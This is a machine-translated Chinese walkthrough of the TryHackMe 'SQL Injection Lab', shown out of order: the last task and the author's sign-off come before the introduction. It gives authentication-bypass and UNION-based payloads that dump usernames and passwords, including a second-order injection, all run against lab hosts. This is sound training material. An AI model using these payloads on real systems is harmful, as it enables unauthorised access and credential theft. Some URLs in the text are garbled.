translated">它没有向我显示任何东西，这意味着这是攻击者的错误</p><p id="d7a5" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这意味着在数据库中只有4列</p><p id="730a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">让我们检查一下有多少列容易受到攻击，为此我们使用了<strong class="ku ir"> UNION SELECT </strong></p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="9e48" class="lo lp iq mz b gy nd ne l nf ng">') union select 1,2,3,4-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi rf"><img src="../Images/bcf79d43565a5a7979889a348c08b01e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JkKKoBBv0vFiTZd8e_4fCQ.png"/></div></div></figure><p id="7c6a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">查询显示第3列是易受攻击的<strong class="ku ir"> {2，3，4} </strong>位置</p><p id="76ee" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">让我们从数据库中获取信息</p><p id="c7a8" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果你了解mysql，你可以很容易理解这个查询</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="54f1" class="lo lp iq mz b gy nd ne l nf ng">') union select 1,group_concat(username),group_concat(password),4 from users-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi rg"><img src="../Images/3b215fc051881e62e75a11387455c877.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*W7o3XINE5CRdGqhqPi2-gA.png"/></div></div></figure><h1 id="cf6d" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">任务10:易受攻击的启动:书名2</h1><h1 id="2c16" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">目标</h1><p id="1d0f" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">在这个挑战中，应用程序在过程的早期执行查询。然后，它在第二个查询中使用第一个查询的结果，而不进行清理。这两个查询都容易受到攻击，第一个查询可以通过盲SQL注入被利用。然而，由于第二个查询也是易受攻击的，所以可以简化利用并使用基于联合的注入来代替基于布尔的盲注入；使开发更容易，噪音更小。任务的目标是在不使用盲SQL注入的情况下滥用此漏洞并取回旗帜。</p><h1 id="1713" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">描述</h1><p id="65dd" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">当用户首次登录挑战时，会出现一条消息，提示他们:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="57e7" class="lo lp iq mz b gy nd ne l nf ng">Testing a new function to search for books, check it out here</span></pre><p id="e9fa" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">“此处”文本是一个链接，将用户带到<a class="ae kr" href="http://10.10.141.207/challenge7/book?title=test" rel="noopener ugc nofollow" target="_blank">http://10 . 10 . 141 . 207:5000/challenge 7/book？title=test </a>，这是包含易受攻击的搜索功能的页面，可以在此处看到:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi rh"><img src="../Images/071b9e3002c5cdc2d273759d75001f54.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*gbmI47RD8oHGyvFc.png"/></div></div></figure><p id="63b2" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当搜索书名时，网页执行GET请求。然后应用程序执行两个查询，第一个查询获取书的ID，然后在这个过程的后面，执行一个新的SQL查询来获取关于书的所有信息。这里可以看到两个查询:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="b3e1" class="lo lp iq mz b gy nd ne l nf ng">bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", one=True)</span><span id="0c03" class="lo lp iq mz b gy nh ne l nf ng">if bid:</span><span id="c715" class="lo lp iq mz b gy nh ne l nf ng">query = f"SELECT * FROM books WHERE id = '{bid['id']}'"</span></pre><p id="d89e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">首先，我们将结果限制为零行，这可以通过不给它任何输入或我们知道不存在的输入来实现。然后，我们可以使用UNION子句来控制第一个查询返回的内容，即第二个查询将使用的数据。这意味着我们可以在搜索字段中注入以下值:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="4743" class="lo lp iq mz b gy nd ne l nf ng">' union select 'STRING</span></pre><p id="5751" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">注入上述代码后，应用程序将执行以下SQL查询:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi rd"><img src="../Images/1f7b5fc26a4a2924c5aff646333ada5f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1352/format:webp/0*770oBYuuY4XeIOf0.png"/></div></figure><p id="0c92" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">从查询中，我们可以看到第一个查询的结果是STRING%，它用在第二个查询的WHERE子句中。</p><p id="b095" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果我们用数据库中存在的数字替换' STRING ',应用程序应该返回一个有效的对象。但是，应用程序在字符串中添加了通配符(%)，这意味着我们必须首先注释掉通配符。可以通过在我们注入的字符串末尾附加'—'来注释掉通配符。例如，如果我们注入以下代码行:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="f60c" class="lo lp iq mz b gy nd ne l nf ng">' union select '1'-- -</span></pre><p id="ac78" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">应用程序应该向用户显示ID为1的图书，如下所示:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ri"><img src="../Images/89ae81e358fd424d06f73f81d05f9f09.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7tkxjdUgQ1Yp8R-p.png"/></div></div></figure><p id="57ef" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果我们没有首先将结果限制为零行，我们就不会得到UNION语句的输出，而是会得到LIKE子句的内容。例如，通过注入以下字符串:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="5c5a" class="lo lp iq mz b gy nd ne l nf ng">test' union select '1'-- -</span></pre><p id="20d4" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">应用程序将执行以下查询:。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi rd"><img src="../Images/7a257efd20d174759c57f5a1e8ae8352.png" data-original-src="https://miro.medium.com/v2/resize:fit:1352/format:webp/0*j404gJI3X-63H-BW.png"/></div></figure><p id="578e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">现在我们已经完全控制了第二个查询，我们可以使用基于联合的SQL注入从数据库中提取数据。目标是使第二个查询类似于以下查询:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="8248" class="lo lp iq mz b gy nd ne l nf ng">SELECT * FROM books WHERE <strong class="mz ir">id</strong> = '' union select 1,2,3,4-- -</span></pre><p id="bf3c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">让应用程序执行上面的查询应该和注入下面的查询一样简单:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="ae6c" class="lo lp iq mz b gy nd ne l nf ng">' union select '1' union select 1,2,3,4-- -</span></pre><p id="7a1c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">但是，我们通过在第二个UNION子句前附加单引号(')来结束应该返回的字符串。为了使查询有效并返回第二个UNION子句，我们必须对单引号进行转义。对单引号进行转义可以通过将引号(')对折来完成。将引号加倍后，我们得到以下字符串:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="a30c" class="lo lp iq mz b gy nd ne l nf ng">' union select '-1''union select 1,2,3,4-- -</span></pre><p id="356f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">注入上面的字符串将返回如下所示的页面:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi rj"><img src="../Images/f89e870006a6c214826a3d742d5f89e3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1344/format:webp/1*AJ7N3lxgyHSPl-aXc-myUQ.png"/></div></figure><h1 id="80fd" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">工作</h1><p id="6162" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">使用你所了解的关于SQL注入联盟的知识，利用易受攻击的图书搜索功能来检索旗帜</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="ec0f" class="lo lp iq mz b gy nd ne l nf ng">' union select '-1''union select 1,group_concat(username),group_concat(password),4 from users-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi rk"><img src="../Images/1378fa0002008ceb68a18a46b6c33dda.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SIFSkoQNTC1grQW9tqHjSQ.png"/></div></div></figure><p id="c7f8" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">嘣！我们拿到最后一面旗了</p><p id="3b46" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">你可以在:<br/><strong class="ku ir">LinkedIn:-</strong><a class="ae kr" href="https://www.linkedin.com/in/shamsher-khan-651a35162/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/shamsher-khan-651a35162/</a><br/><strong class="ku ir">Twitter:-</strong><a class="ae kr" href="https://twitter.com/shamsherkhannn" rel="noopener ugc nofollow" target="_blank">https://twitter.com/shamsherkhannn</a><br/><strong class="ku ir">Tryhackme:-</strong><a class="ae kr" href="https://tryhackme.com/p/Shamsher" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/p/Shamsher</a></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi rl"><img src="../Images/09e5bbba06c7688a702aeec8570d243c.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/1*Vve7XR6kstH7qA5iQQ-kYA.png"/></div></figure><p id="5f53" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如需更多演练，请在出发前继续关注…<br/>…</p><p id="2dd5" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">访问我的其他演练:-</p><div class="rm rn gp gr ro rp"><a href="https://shamsher-khan.medium.com/linux-privesc-tryhackme-writeup-df48d3f77d19" rel="noopener follow" target="_blank"><div class="rq ab fo"><div class="rr ab rs cl cj rt"><h2 class="bd ir gy z fp ru fr fs rv fu fw ip bi translated">Linux PrivEsc Tryhackme文章</h2><div class="rw l"><h3 class="bd b gy z fp ru fr fs rv fu fw dk translated">作者Shamsher khan这是一篇关于Tryhackme room“JLinux PrivEsc”的文章</h3></div><div class="rx l"><p class="bd b dl z fp ru fr fs rv fu fw dk translated">shamsher-khan.medium.com</p></div></div><div class="ry l"><div class="rz l sa sb sc ry sd kl rp"/></div></div></a></div><div class="rm rn gp gr ro rp"><a href="https://shamsher-khan.medium.com/dns-manipulation-tryhackme-writeup-931b06ef02cd" rel="noopener follow" target="_blank"><div class="rq ab fo"><div class="rr ab rs cl cj rt"><h2 class="bd ir gy z fp ru fr fs rv fu fw ip bi translated">DNS操纵尝试黑客技术</h2><div class="rw l"><h3 class="bd b gy z fp ru fr fs rv fu fw dk translated">这是一篇关于Tryhackme room“DNS操纵”的文章</h3></div><div class="rx l"><p class="bd b dl z fp ru fr fs rv fu fw dk translated">shamsher-khan.medium.com</p></div></div><div class="ry l"><div class="se l sa sb sc ry sd kl rp"/></div></div></a></div><div class="rm rn gp gr ro rp"><a href="https://link.medium.com/DNfhWzmtveb" rel="noopener follow" target="_blank"><div class="rq ab fo"><div class="rr ab rs cl cj rt"><h2 class="bd ir gy z fp ru fr fs rv fu fw ip bi translated">Wekor Tryhackme报道</h2><div class="rw l"><h3 class="bd b gy z fp ru fr fs rv fu fw dk translated">作者Shamsher khan这是一篇关于Tryhackme room“Wekor”的文章</h3></div><div class="rx l"><p class="bd b dl z fp ru fr fs rv fu fw dk translated">link.medium.com</p></div></div><div class="ry l"><div class="sf l sa sb sc ry sd kl rp"/></div></div></a></div><p id="b300" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><a class="ae kr" href="https://shamsher-khan.medium.com/sql-injection-tryhackme-writeup-e7c78542bfb9" rel="noopener">https://shams her-Khan . medium . com/SQL-injection-tryhackme-writeup-e7c 78542 bfb 9</a></p><p id="3b80" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">感谢您花时间阅读我的演练。<br/>如果您觉得有帮助，请点击👏按钮👏(高达40倍)并分享<br/>给有类似兴趣的人帮助！+随时欢迎反馈！SQL注入实验室Tryhackme书面报告</p><p id="6f0e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">作者Shamsher khan这是一篇关于Tryhackme室“SQL注入实验室”的文章</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi kf"><img src="../Images/127cd388c4071b3b7de77c8693ce1e8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1018/format:webp/1*DA0hBMnMsKkhHvPXXmGDjw.png"/></div><figcaption class="kn ko gj gh gi kp kq bd b be z dk translated"><a class="ae kr" href="https://tryhackme.com/room/sqlilab" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/sqlilab</a></figcaption></figure><p id="0e8d" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">房间链接:</strong><a class="ae kr" href="https://tryhackme.com/room/sqlilab" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/sqlilab</a><br/><strong class="ku ir">注:此房免费</strong></p><p id="3eb4" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在你完成这个记录之前，先完成这个房间</p><h2 id="0bac" class="lo lp iq bd lq lr ls dn lt lu lv dp lw lb lx ly lz lf ma mb mc lj md me mf mg bi translated"><a class="ae kr" href="https://shamsher-khan.medium.com/sql-injection-tryhackme-writeup-e7c78542bfb9" rel="noopener"> SQL注入Tryhackme写文章</a></h2><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/8d85d6e94c74541d10ee355bdeb0c184.png" data-original-src="https://miro.medium.com/v2/resize:fit:1070/format:webp/0*ehSa9dUz2t1KOcVt.png"/></div><figcaption class="kn ko gj gh gi kp kq bd b be z dk translated"><a class="ae kr" href="https://shamsher-khan.medium.com/sql-injection-tryhackme-writeup-e7c78542bfb9" rel="noopener">https://shams her-Khan . medium . com/SQL-injection-tryhackme-writeup-e7c 78542 bfb 9</a></figcaption></figure><h1 id="c6c4" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">任务SQL注入简介:第1部分</h1><p id="777d" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">SQL注入是一种技术，通过这种技术，攻击者可以执行他们自己的恶意SQL语句，通常称为恶意负载。通过恶意的SQL语句，攻击者可以从受害者的数据库中窃取信息；更糟糕的是，他们可能能够对数据库进行更改。我们的员工管理web应用程序有SQL注入漏洞，它模仿了开发人员经常犯的错误。</p><p id="d29b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">应用程序通常需要动态SQL查询来根据用户设置的不同条件显示内容。为了支持动态SQL查询，开发人员通常将用户输入直接连接到SQL语句中。如果不对接收到的输入进行检查，字符串连接将成为导致SQL注入漏洞的最常见错误。如果没有输入敏感性，用户可以让数据库将用户输入解释为SQL语句，而不是数据。换句话说，攻击者必须能够访问一个他们可以控制的参数，这个参数将进入SQL语句。通过控制参数，攻击者可以注入恶意查询，该查询将由数据库执行。如果应用程序没有从攻击者控制的参数中清理给定的输入，查询将容易受到SQL注入攻击。</p><p id="88fa" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">下面的PHP代码演示了从。来自POST请求的用户和密码变量被直接连接到SQL语句中。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="e7d6" class="lo lp iq mz b gy nd ne l nf ng">$query = "SELECT * FROM users WHERE username='" + $_POST["user"] + "' AND password= '" + $_POST["password"]$ + '";"</span></pre><p id="223e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果攻击者在name参数中提供值“OR 1=1”，查询可能会返回多个用户。大多数应用程序将处理返回的第一个用户，这意味着攻击者可以利用这一点，并作为查询返回的第一个用户登录。双破折号(—)序列是SQL中的注释指示符，导致查询的其余部分被注释掉。在SQL中，字符串包含在单引号(')或双引号(")中。输入中的单引号(')用于结束字符串文字。如果攻击者在name参数中输入' OR 1 = 1--，并将密码留空，那么上面的查询将产生下面的SQL语句。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="23fe" class="lo lp iq mz b gy nd ne l nf ng">SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = ''</span></pre><p id="4837" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果数据库执行上面的SQL语句，将返回users表中的所有用户。因此，攻击者绕过应用程序的身份验证机制，作为查询返回的第一个用户登录。</p><p id="82e6" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">使用— —而不是——的原因主要是因为MySQL处理双破折号注释样式的方式。</p><p id="cfc4" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">从序列到行尾。在MySQL中——(双破折号)注释样式要求第二个破折号后面至少跟一个空格或控制字符(比如空格、制表符、换行符等等)。这种语法与标准的SQL注释语法略有不同，如1.7.2.4章节“作为注释的开始”中所讨论的。(<a class="ae kr" href="https://dev.mysql.com/doc/refman/8.0/en/comments.html" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir"/></a><strong class="ku ir">)</strong></p><p id="5a70" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">内联SQL注释最安全的解决方案是使用— <space> <any character="">比如—，因为如果它被URL编码成—% 20—它仍然会被解码为—。更多信息，请参见:<a class="ae kr" href="https://blog.raw.pm/en/sql-injection-mysql-comment/" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir"/></a></any></space></p><p id="f26e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">SQL注入1:输入框非字符串</p><p id="e055" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当用户登录时，应用程序执行以下查询:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="4510" class="lo lp iq mz b gy nd ne l nf ng">SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=10 AND password = 'ce5ca67...'</span></pre><p id="5d0b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">登录时，用户向profileID参数提供输入。对于这个挑战，参数接受一个整数，如下所示:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="f54e" class="lo lp iq mz b gy nd ne l nf ng">profileID=10</span></pre><p id="9eb4" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">因为没有输入清理，所以可以通过使用任何真条件(例如下面的条件)作为ProfileID来绕过登录</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="5bf2" class="lo lp iq mz b gy nd ne l nf ng">1 or 1=1-- -</span></pre><p id="812e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">绕过登录并检索标志。</p><p id="044a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">SQL注入2:输入框字符串</p><p id="4fd5" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这个挑战使用与前一个挑战相同的查询。但是，该参数需要的是字符串而不是整数，如下所示:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="af3e" class="lo lp iq mz b gy nd ne l nf ng">profileID='10'</span></pre><p id="8b00" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">因为它需要一个字符串，所以我们需要修改我们的有效负载来稍微绕过登录。下面一行将让我们进入:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="a8f0" class="lo lp iq mz b gy nd ne l nf ng">1' or '1'='1'-- -</span></pre><p id="6e81" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">绕过登录并检索标志。</p><p id="6a19" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">SQL注入3和4: URL和POST注入</p><p id="1e39" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这里，SQL查询与前一个相同:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="a6d6" class="lo lp iq mz b gy nd ne l nf ng">SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='10' AND password='ce5ca67...'</span></pre><p id="2ea5" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">但是在这种情况下，恶意用户输入不能通过登录表单直接注入到应用程序中，因为已经实现了一些客户端控件:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="241e" class="lo lp iq mz b gy nd ne l nf ng">function <strong class="mz ir">validateform</strong>() {</span><span id="3553" class="lo lp iq mz b gy nh ne l nf ng">var profileID = document.inputForm.profileID.value;</span><span id="3e44" class="lo lp iq mz b gy nh ne l nf ng">var password = document.inputForm.password.value;</span><span id="d384" class="lo lp iq mz b gy nh ne l nf ng">if (/^[a-zA-Z0-9]*$/.<strong class="mz ir">test</strong>(profileID) == false || /^[a-zA-Z0-9]*$/.<strong class="mz ir">test</strong>(password) == false) {</span><span id="28fe" class="lo lp iq mz b gy nh ne l nf ng"><strong class="mz ir">alert</strong>("The input fields cannot contain special characters");</span><span id="32b4" class="lo lp iq mz b gy nh ne l nf ng">return false;</span><span id="d380" class="lo lp iq mz b gy nh ne l nf ng">}</span><span id="dff9" class="lo lp iq mz b gy nh ne l nf ng">if (profileID == null || password == null) {</span><span id="3c5d" class="lo lp iq mz b gy nh ne l nf ng"><strong class="mz ir">alert</strong>("The input fields cannot be empty.");</span><span id="e815" class="lo lp iq mz b gy nh ne l nf ng">return false;</span><span id="9e78" class="lo lp iq mz b gy nh ne l nf ng">}</span><span id="5eba" class="lo lp iq mz b gy nh ne l nf ng">}</span></pre><p id="5c88" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">上面的JavaScript代码要求profileID和密码只包含a-z、A-Z和0–9之间的字符。客户端控件只是为了改善用户体验，并不是一种安全功能，因为用户可以完全控制客户端及其提交的数据。例如，可以使用Burp Suite等代理工具绕过客户端JavaScript验证<strong class="ku ir">(</strong><a class="ae kr" href="https://portswigger.net/support/using-burp-to-bypass-client-side-javascript-validation" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir">https://ports wigger . net/support/using-Burp-to-bypass-client-side-JavaScript-validation</strong></a><strong class="ku ir">)</strong>。</p><p id="fce8" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">q . 1</strong>:SQL注入1:输入框非字符串的标志是什么？</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/623a215d34b33ea05f1abea2389db991.png" data-original-src="https://miro.medium.com/v2/resize:fit:880/format:webp/1*_zBLd5uA0R0e-8sVjLFCYg.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nj"><img src="../Images/09f2f370326107e6067975beebda043b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FNCxvt4_YIVX8U19a-NTTg.png"/></div></div></figure><p id="2d7c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">q . 2</strong>:SQL注入2:输入框字符串的标志是什么？</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi no"><img src="../Images/bd9ce2b3722ca72811201a7e0d0d6692.png" data-original-src="https://miro.medium.com/v2/resize:fit:802/format:webp/1*RE4bjSYtLWv8iENX0UVvdA.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi np"><img src="../Images/7ec5686758f4752288728f1d154835f1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Pg66tuZf4E9-Lzs701-uSg.png"/></div></div></figure><p id="5dcd" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">q . 3</strong>:SQL注入3: URL注入的标志是什么？</p><p id="d21c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">此挑战在提交登录表单时使用GET请求，如下所示:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nq"><img src="../Images/455af003bd371791684cab4673aa3731.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*B4zb_JSSE2qJo-dr.png"/></div></div></figure><p id="355b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">通过直接访问以下URL，可以轻松绕过登录和客户端验证:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="e817" class="lo lp iq mz b gy nd ne l nf ng"><a class="ae kr" href="http://10.10.231.136:5000/sesqli3/login?profileID=-1'" rel="noopener ugc nofollow" target="_blank">http://10.10.231.136:5000/sesqli3/login?profileID=</a>a' or 1=1 --a' or 1=1 --&amp;password=a</span></pre><p id="26ce" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi 